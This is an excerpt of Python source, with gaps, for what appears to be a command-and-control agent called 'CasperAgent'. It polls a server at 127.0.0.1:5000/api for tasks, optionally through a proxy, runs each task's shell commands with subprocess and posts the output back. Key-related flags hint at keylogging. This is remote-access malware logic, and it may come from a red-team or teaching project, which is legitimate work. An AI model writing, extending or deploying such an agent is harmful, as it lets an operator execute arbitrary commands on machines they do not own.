...
# result = subprocess.check_output([bat-cmd], stderr=subprocess.STDOUT)


# command line args for easy deployment from the command line
listeningServer = '127.0.0.1'
listeningPort = '5000'
path = '/api'
...
class CasperAgent():
    def __init__(self):
        ...
        self.speed = 5  # default request speed in seconds
        self.log = ""
        self.bKey = False
        self.bStopKey = False
    ...
    def getTask(self):
        ...
        if not self.usingDutchmanProxy:
            response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(d)).json()
            return response
        else:
            try:
                response = requests.get(self.url, headers=self.jsonHeader, timeout=1, data=json.dumps(d)).json()
            except Exception:
    ...
    def runTask(self):
        ...
        if 'none' not in task:  # dont enter if no tasks
            ...
            # run shell commands
                ...
                try:
                    result = subprocess.check_output([i for i in task['command']], stderr=subprocess.STDOUT).decode(
                        'utf-8')
                    task['command'] = save
                    self.putResult(task, result)
                except Exception:
